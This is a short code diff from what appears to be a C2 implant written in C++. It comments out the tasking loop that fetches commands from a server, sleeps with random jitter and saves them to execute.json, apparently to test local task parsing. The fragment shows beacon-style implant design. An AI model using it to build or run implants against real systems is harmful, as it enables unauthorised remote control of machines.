@@ -160,15 +160,15 @@ void runLoop(int implant_id)
         {
 
             // WAS FOR TESTING PURPOSES - CHANGE LATER
-            std::string getting = getTasks(implant_id);
+            // std::string getting = getTasks(implant_id);
       
-            jitter = rand() * 10;
-            Sleep(SLEEP + jitter);
-            json commands = json::parse(getting);
+            // jitter = rand() * 10;
+            // Sleep(SLEEP + jitter);
+            // json commands = json::parse(getting);
             std::string jsonfile = "execute.json";
-            std::ofstream o(jsonfile);
-            o << commands << std::endl;
-            o.close();
+            // std::ofstream o(jsonfile);
+            // o << commands << std::endl;
+            // o.close();
 
             parseTasks(jsonfile);
 
